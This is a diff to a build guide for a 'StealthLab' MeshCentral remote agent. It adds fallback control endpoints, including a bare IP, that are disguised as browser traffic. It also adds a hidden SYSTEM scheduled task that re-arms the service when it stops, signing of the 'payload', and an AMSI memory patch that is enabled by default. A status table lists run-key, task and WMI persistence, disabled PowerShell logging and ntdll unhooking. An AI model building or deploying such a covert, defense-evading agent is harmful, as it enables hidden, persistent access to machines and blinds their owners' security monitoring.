@@ -46,6 +46,43 @@ The StealthLab build now consumes all network metadata directly from `branding_c
 
 All of this is wired into the automated toolchain: `branding_config*.json` feeds `tools/embed_provisioning*.ps1`, `build.ps1`/`stage_meshcentral_agents.ps1` carry the refreshed `.msh` + headers forward, and `tools/Invoke-RuntimeValidation.ps1` exercises the install/uninstall + network rotation with zero manual clicks.
 
+#### Firewall / Proxy / Fallback Checklist
+
+| Host / Endpoint | Port | Protocol | Purpose |
+| --- | --- | --- | --- |
+| `agents.high.support` | 4445 | WSS (`https` upgrade) | Primary control channel (`network.primaryEndpoint`) |
+| `agents.high.support` | 4446 | WSS | Same POP, alternate listener (fallback #1) |
+| `agents-dr.high.support` | 4445 | WSS | DR / secondary POP (fallback #2) |
+| `198.51.100.45` | 443 | WSS (explicit IP) | Bare-IP egress for environments that strip DNS (fallback #3) |
+
+**Allowlist requirements**
+
+- Outbound TCP 443/4445/4446 to the hosts above (plus the corresponding CDN/front door if you change branding later).
+- DPI/WAF rules must allow the branded `Host`, `SNI`, and `User-Agent` values for each endpoint—fallback entries intentionally camouflage as mainstream browsers, so copy those strings into your policy.
+- If the estate forces a proxy, bake the proxy URL into the `.msh` (`WebProxy=`) or rely on the WinHTTP auto-helper; do **not** rely on per-host manual settings.
+
+**Blocked-host validation steps (run after staging)**
+
+1. Add a temporary outbound block for the primary host (PowerShell example):
+   ```powershell
+   $primaryIp = (Resolve-DnsName agents.high.support | Select-Object -First 1 -ExpandProperty IPAddress)
+   New-NetFirewallRule -DisplayName 'DiagHost Block Primary' -Direction Outbound -Action Block `
+       -RemoteAddress $primaryIp -RemotePort 4445 -Protocol TCP
+   ```
+2. Execute `tools\Invoke-RuntimeValidation.ps1` (now with the default MeshCentral preflight).  
+   The harness logs the fallback ordinal (`verification\phase3\runtime.log`) and the “MeshCentral Download” test still passes because it rotates to fallback #1.
+3. Remove the test rule:
+   ```powershell
+   Remove-NetFirewallRule -DisplayName 'DiagHost Block Primary'
+   ```
+4. Repeat for each fallback host/IP as part of acceptance so SOC teams see the exact event messages that accompany a blocked endpoint.
+
+**Proxy inspection**
+
+- Use `netsh winhttp show proxy` (or the corporate proxy catalog) to confirm the hostnames above are permitted through the CONNECT ACL.
+- When forcing traffic through a TLS inspection appliance, mirror the branded SNI/Host header in the appliance policy so the certificate replacement chain matches what the agent expects.
+- Runtime validation already surfaces the fallback order and writes the agent logs under `C:\ProgramData\DiagnosticHost\logs`—archive those alongside `verification\phase3\runtime.log` when filing firewall/proxy change requests.
+
 ### JSON schema recap
 
 ```json
@@ -77,6 +114,7 @@ All of this is wired into the automated toolchain: `branding_config*.json` feeds
 - Mix and match `alpn` values to mimic the upstream front door. The provisioning scripts convert the array into the ALPN byte vector and pass it to OpenSSL via `ILibWebClient_Request_SetALPN`, so no manual TLS fiddling is required.
 - To route everything through a corporate proxy, add `WebProxy=http://proxyhost:3128` to the `.msh` (or keep `autoproxy=1` in the datastore). The JS helper still auto-detects, but long-lived deployments should set `WebProxy` explicitly so builds stay deterministic.
 - Network firewalls should allow outbound TCP 4445/4446 (or whatever ports your entries use). The installer already writes a Windows Firewall rule for `C:\Windows\System32\svchost.exe`; runtime validation records the exact host/port that was exercised for the audit trail.
+- Signing & staging: run `build.ps1 -StealthLab -SignStealth -StealthSignerPfx <cert>` to Authenticode sign `MeshService-2022.exe/.dll` before shipping. `tools/stage_meshcentral_agents.ps1` now mirrors those signed binaries into both `meshcentral-data\agents` and `meshcentral-data\signedagents`, so MeshCentral’s download cache re-signs the latest payload (no stale hashes during runtime validation).
 
 ## Service Registry Configuration
 
@@ -216,10 +254,31 @@ schtasks /Create /TN "\Microsoft\Windows\Diagnostics\DiagnosticHostAutoStart" `
 ```
 
 **Customization Macros:**
-- `MESH_AGENT_PERSIST_RESTART_TASK_NAME` – rename the restart task
-- `MESH_AGENT_PERSIST_WMI_CLASS` / `_METHOD` / `_NAMESPACE` – future-proof hooks if we switch back to permanent WMI consumers
+- `MESH_AGENT_PERSIST_RESTART_TASK_NAME` - rename the restart task
+- `MESH_AGENT_PERSIST_WMI_CLASS` / `_METHOD` / `_NAMESPACE` - future-proof hooks if we switch back to permanent WMI consumers
 
 **Behavior:**
+- Re-arms the svchost service whenever Event ID 7036 reports that `WinDiagnosticHost` stopped.
+- Runs as SYSTEM with Highest privileges and a hidden task path.
+
+**Branding toggle:**
+
+```jsonc
+"persistence": {
+  "wmi": {
+    "enabled": true,
+    "taskName": "WinDiagnosticHost-RestartOnStop"
+  }
+}
+```
+
+- Set `persistence.wmi.enabled=false` to suppress the ONEVENT task entirely (defaults to **true**).
+- `taskName` is optional; if omitted the installer emits `\{ServiceName}-RestartOnStop`.
+- Regenerate branding headers (`tools/embed_provisioning.ps1`) after editing the JSON.
+
+**Automation & validation:**
+- `tools/Invoke-RuntimeValidation.ps1` now fails when the restart-on-stop task is missing while the branding profile keeps it enabled, and it confirms the task stays absent when you set the flag to false.
+- The installer log records every scheduled-task add/remove operation so you have on-disk evidence for audits (`C:\ProgramData\DiagnosticHost\logs\installer.log`).
 - Automatically restarts service when it stops
 - Monitors Windows Event Log for service stop events
 - Near-instant restart (< 1 second)
@@ -292,6 +351,20 @@ Restart-Service WinDiagnosticHost
 "STEALTH_API_UNHOOK"="1"
 "STEALTH_FIREWALL"="1"
 ```
+
+---
+
+### Branding toggle (default **enabled**)
+
+```jsonc
+"stealth": {
+  "amsiPatch": true
+}
+```
+
+- Set `stealth.amsiPatch=false` to keep AMSI untouched (useful for red-team/lab comparisons).
+- The installer logs `AMSI patch applied per branding profile` or `AMSI patch disabled via branding profile` so runs are auditable.
+- `tools/Invoke-RuntimeValidation.ps1` now scrubs `installer.log` each run and fails when the log contents don't match the branding intent.
 
 ---
 
@@ -557,9 +630,9 @@ Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\WinDiagnosticHost\Envi
 | Account | Active | LocalSystem |
 | RunKey Persistence | ✅ Enabled | HKLM\Run |
 | Task Persistence | ✅ Enabled | Logon trigger |
-| WMI Persistence | ✅ Enabled | Event-based |
+| WMI Persistence | ✅ Enabled | Event-based task (`\{Service}-RestartOnStop`) |
 | Watchdog | ✅ Enabled | 10 min interval |
-| AMSI Bypass | ✅ Enabled | Memory patch |
+| AMSI Bypass | ✅ Enabled | Memory patch (`stealth.amsiPatch=true`) |
 | PSLogging Disable | ✅ Enabled | All logs |
 | API Unhook | ✅ Enabled | ntdll restore |
 | Firewall Rules | ✅ Enabled | Auto-create |
